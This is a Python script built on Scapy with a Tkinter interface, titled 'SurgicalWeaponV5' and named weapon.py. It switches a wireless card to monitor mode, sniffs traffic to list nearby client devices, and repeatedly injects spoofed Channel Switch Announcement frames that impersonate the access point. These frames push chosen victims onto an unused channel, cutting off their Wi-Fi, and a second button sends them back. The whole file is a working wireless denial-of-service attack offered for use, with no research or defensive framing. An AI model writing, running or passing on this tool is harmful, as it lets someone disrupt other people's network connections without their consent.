import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalWeaponV5:
    def __init__(self, iface):
        self.iface = iface
        self.clients = {}  
        self.active_attacks = set()
        
        self.prepare_hardware()
        
        self.root = tk.Tk()
        self.root.title("CSA Steering Logic v5.0 (WPA3/PMF)")
        self.root.geometry("700x550")
        self.root.configure(bg="#050505")

        # --- GUI Elements ---
        self.listbox = tk.Listbox(self.root, selectmode='multiple', bg="#111", fg="#00FF41", font=("Courier", 10), height=18)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="STEER (KICK)", command=self.start_steer, bg="#AA0000", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="RESTORE (PULL)", command=self.restore_client, bg="#0055FF", fg="white", width=15).pack(side="left", padx=5)
        
        self.status_label = tk.Label(self.root, text="Ready for Injection...", bg="#050505", fg="#555")
        self.status_label.pack()

        threading.Thread(target=self.discovery_engine, daemon=True).start()

    def prepare_hardware(self):
        os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def discovery_engine(self):
        def handler(pkt):
            if pkt.haslayer(Dot11) and pkt.type == 2:
                c, b = pkt.addr2, pkt.addr3
                if b and c and c != b and c != "ff:ff:ff:ff:ff:ff":
                    if c not in self.clients:
                        # Logic: Identify current channel automatically
                        channel = int(ord(pkt[RadioTap].notdecoded[0:1])) if pkt.haslayer(RadioTap) else 1
                        self.clients[c] = {"BSSID": b, "Channel": channel}
                        self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=handler, store=0)

    def create_csa_frame(self, client_mac, bssid, channel):
        # Logic: Category 0 (Spectrum Management), Action 4 (Channel Switch)
        # Element ID 37 (Channel Switch Announcement)
        # Mode: 1 (Stop transmitting), New Channel, Count: 0 (Immediate)
        dot11 = Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
        # Constructing the CSA Information Element manually for maximum compatibility
        csa_payload = b"\x00\x04\x25\x03\x01" + bytes([channel]) + b"\x00"
        return RadioTap()/dot11/Dot11Action()/csa_payload

    def start_steer(self):
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            data = self.clients[mac]
            # Send to a non-existent channel (Logic: 165 is usually unused)
            pkt = self.create_csa_frame(mac, data["BSSID"], 165)
            self.active_attacks.add(mac)
            
            def attack_loop():
                while mac in self.active_attacks:
                    sendp(pkt, iface=self.iface, verbose=False, count=5)
                    time.sleep(1)
            
            threading.Thread(target=attack_loop, daemon=True).start()
        self.refresh_ui()

    def restore_client(self):
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            if mac in self.active_attacks:
                self.active_attacks.remove(mac)
                data = self.clients[mac]
                # Logic: Steer them back to their original channel
                restore_pkt = self.create_csa_frame(mac, data["BSSID"], data["Channel"])
                sendp(restore_pkt, count=20, iface=self.iface, verbose=False)
        self.refresh_ui()

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.clients.items():
            status = " [STEERING...] " if mac in self.active_attacks else " [CONNECTED] "
            self.listbox.insert(tk.END, f"{status} {mac} | AP: {info['BSSID']} | CH: {info['Channel']}")

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: SurgicalWeaponV5(sys.argv[1]).root.mainloop()
